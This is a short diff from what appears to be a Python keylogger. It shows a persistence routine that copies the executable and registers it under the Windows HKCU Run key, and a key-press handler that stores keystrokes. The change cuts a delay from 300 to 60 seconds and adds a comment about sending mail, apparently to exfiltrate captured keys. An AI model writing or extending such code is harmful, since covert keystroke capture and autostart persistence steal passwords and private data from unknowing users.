@@ -13,7 +13,8 @@ def presistencs():
     if not os.path.exists(file_location):
         shutil.copyfile(sys.executable,file_location)
         subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v tata /t REG_SZ /d "'+file_location+'"',shell=True)
-time.sleep(300)
+     # code send mail after 60 sec
+time.sleep(60)
 def key_press(key):
     global store_keys
     try:
